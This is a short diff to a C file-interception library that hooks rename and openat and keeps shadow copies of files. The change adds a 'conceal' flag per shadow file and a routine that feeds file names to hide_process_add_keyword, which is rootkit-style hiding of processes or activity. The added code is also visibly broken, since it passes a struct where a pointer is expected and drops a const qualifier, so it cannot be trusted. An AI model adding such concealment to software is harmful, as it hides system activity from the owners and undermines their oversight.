@@ -29,6 +29,7 @@ typedef struct {
 
 static fd_mapping_t fd_map[MAX_FDS];
 static shadow_file_t shadow_files[MAX_SHADOWS];
+static bool conceal[MAX_SHADOWS];
 static pthread_mutex_t fd_map_lock = PTHREAD_MUTEX_INITIALIZER;
 
 // Function pointers to real implementations
@@ -42,6 +43,33 @@ static int (*real_rename)(const char *, const char *) = NULL;
 static int (*real_renameat)(int, const char *, int, const char *) = NULL;
 static int (*real_renameat2)(int, const char *, int, const char *, unsigned int) = NULL;
 static int (*real_openat)(int, const char *, int, ...) = NULL;
+
+const char *get_filename_from_shadow(const shadow_file_t *sf) {
+    if (sf == NULL || sf->original_path == NULL) {
+        return NULL;
+    }
+
+    const char *path = sf->original_path;
+    const char *last_slash = strrchr(path, '/');
+
+    // If there’s no slash, the whole path is the name
+    if (last_slash == NULL) {
+        return path;
+    }
+
+    // Skip the slash
+    return last_slash + 1;
+}
+
+static void update_conceal(void) {
+    for (int i = 0; i < MAX_SHADOWS; i ++) {
+        char *fname = get_filename_from_shadow(shadow_files[i]);
+	if (conceal[i])
+	    hide_process_add_keyword(fname);
+	else
+	    hide_process_remove_keyword(fname);
+    }
+}
 
 // Initialize function pointers
 static void init_hooks(void) {
